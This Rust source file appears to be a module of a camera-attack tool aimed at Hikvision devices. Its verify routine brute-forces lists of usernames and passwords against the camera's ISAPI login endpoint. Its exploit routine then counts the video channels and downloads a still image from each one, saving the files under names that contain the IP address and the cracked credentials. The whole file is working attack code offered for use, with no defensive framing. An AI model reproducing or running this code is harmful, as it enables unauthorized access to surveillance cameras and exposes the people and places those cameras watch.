use crate::config::Config;
use crate::poc::{download_snapshot, Poc, PocResult};
use anyhow::Result;
use reqwest::blocking::Client;
use scraper::{Html, Selector};
use std::path::PathBuf;

pub struct HikvisionWeakPassword {
    name: String,
    product: String,
}

impl HikvisionWeakPassword {
    pub fn new(_config: &Config) -> Self {
        HikvisionWeakPassword {
            name: "hikvision-weak-password".to_string(),
            product: "hikvision".to_string(),
        }
    }
}

impl Poc for HikvisionWeakPassword {
    fn name(&self) -> &str {
        &self.name
    }

    fn product(&self) -> &str {
        &self.product
    }

    fn verify(&self, ip: &str, port: u16, config: &Config) -> Option<PocResult> {
        let url = format!("http://{}:{}/ISAPI/Security/userCheck", ip, port);
        let client = Client::builder()
            .timeout(std::time::Duration::from_secs(config.timeout))
            .build()
            .ok()?;

        for user in &config.users {
            for password in &config.passwords {
                match client
                    .get(&url)
                    .basic_auth(user, Some(password))
                    .header("User-Agent", &config.user_agent)
                    .header("Connection", "close")
                    .send()
                {
                    Ok(response) => {
                        if response.status().as_u16() == 200 {
                            if let Ok(text) = response.text() {
                                if text.contains("userCheck")
                                    && text.contains("statusValue")
                                    && text.contains("200")
                                {
                                    return Some(PocResult {
                                        ip: ip.to_string(),
                                        port,
                                        product: self.product.clone(),
                                        user: user.clone(),
                                        password: password.clone(),
                                        vul_name: self.name.clone(),
                                    });
                                }
                            }
                        }
                    }
                    Err(_) => continue,
                }
            }
        }

        None
    }

    fn exploit(&self, result: &PocResult, config: &Config) -> Result<usize> {
        let client = Client::builder()
            .timeout(std::time::Duration::from_secs(config.timeout))
            .build()?;

        let channels_url = format!(
            "http://{}:{}/ISAPI/Image/channels",
            result.ip, result.port
        );

        let mut channels = 1;

        match client
            .get(&channels_url)
            .basic_auth(&result.user, Some(&result.password))
            .header("User-Agent", &config.user_agent)
            .header("Connection", "close")
            .send()
        {
            Ok(response) => {
                if let Ok(text) = response.text() {
                    let document = Html::parse_document(&text);
                    let selector = Selector::parse("id").unwrap();
                    channels = document.select(&selector).count().max(1);
                }
            }
            Err(_) => {}
        }

        let mut total = 0;
        for channel in 1..=channels {
            let url = format!(
                "http://{}:{}/ISAPI/Streaming/channels/{}01/picture",
                result.ip, result.port, channel
            );
            let file_name = format!(
                "{}-{}-channel{}-{}-{}.jpg",
                result.ip, result.port, channel, result.user, result.password
            );

            let snapshots_dir = PathBuf::from(&config.out_dir).join(&config.snapshots);
            let file_path = snapshots_dir.join(file_name);

            total += download_snapshot(
                &url,
                file_path.to_str().unwrap(),
                config,
                Some(&result.user),
                Some(&result.password),
            )?;
        }

        Ok(total)
    }
}
